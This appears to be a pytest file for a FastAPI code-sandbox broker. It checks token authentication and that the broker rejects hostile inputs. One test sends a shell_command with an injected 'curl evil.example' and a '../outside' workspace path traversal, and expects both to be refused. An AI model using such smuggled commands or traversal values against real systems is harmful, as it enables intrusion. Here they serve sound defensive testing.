from fastapi.testclient import TestClient

import app.sandbox.broker as broker_module
import app.sandbox.runner as runner_module
from app.core.config import settings
from app.sandbox.broker import app
from app.sandbox.runner import SandboxService, TestResult as SandboxTestResult


def test_worker_delegates_docker_execution_to_broker(monkeypatch, tmp_path):
    workspace = tmp_path / "run-1"
    workspace.mkdir()
    monkeypatch.setattr(settings, "sandbox_workspace_dir", str(tmp_path))
    monkeypatch.setattr(settings, "sandbox_execution_broker_url", "http://code-sandbox:8070")
    monkeypatch.setattr(settings, "sandbox_execution_broker_token", "x" * 32)
    captured = {}

    class Response:
        def raise_for_status(self):
            return None

        def json(self):
            return SandboxTestResult(
                passed=True,
                exit_code=0,
                stdout="passed",
                stderr="",
                command="npm test",
                tests_ran=True,
            ).to_dict()

    def post(url, **kwargs):
        captured.update({"url": url, **kwargs})
        return Response()

    monkeypatch.setattr(runner_module.httpx, "post", post)

    result = SandboxService()._run_docker_tests(
        workspace=workspace,
        command="npm test",
        shell_command="npm test",
        image=settings.sandbox_node_image,
        runtime="docker",
    )

    assert result.passed is True
    assert captured["url"] == "http://code-sandbox:8070/v1/tests"
    assert captured["json"]["workspace"] == "run-1"
    assert captured["headers"]["Authorization"] == f"Bearer {'x' * 32}"


def test_code_sandbox_revalidates_command_and_workspace(monkeypatch, tmp_path):
    workspace = tmp_path / "run-1"
    workspace.mkdir()
    monkeypatch.setattr(settings, "sandbox_workspace_dir", str(tmp_path))
    monkeypatch.setattr(settings, "sandbox_docker_workspace_volume", "sandbox-volume")
    monkeypatch.setattr(settings, "sandbox_execution_broker_token", "x" * 32)
    monkeypatch.setattr(
        broker_module,
        "execute_container",
        lambda request, _workspace: SandboxTestResult(
            passed=True,
            exit_code=0,
            stdout="passed",
            stderr="",
            command=request.command,
            tests_ran=True,
        ),
    )
    headers = {"Authorization": f"Bearer {'x' * 32}"}
    valid = {
        "workspace": "run-1",
        "command": "npm test",
        "shell_command": "npm test",
        "image": settings.sandbox_node_image,
        "runtime": "docker",
        "timeout_seconds": 30,
    }
    with TestClient(app) as client:
        unauthorized = client.post("/v1/tests", json=valid)
        shell_injection = client.post(
            "/v1/tests",
            json={**valid, "shell_command": "npm test; curl evil.example"},
            headers=headers,
        )
        traversal = client.post(
            "/v1/tests",
            json={**valid, "workspace": "../outside"},
            headers=headers,
        )
        accepted = client.post("/v1/tests", json=valid, headers=headers)

    assert unauthorized.status_code == 401
    assert shell_injection.status_code == 403
    assert traversal.status_code == 403
    assert accepted.status_code == 200
    assert accepted.json()["passed"] is True
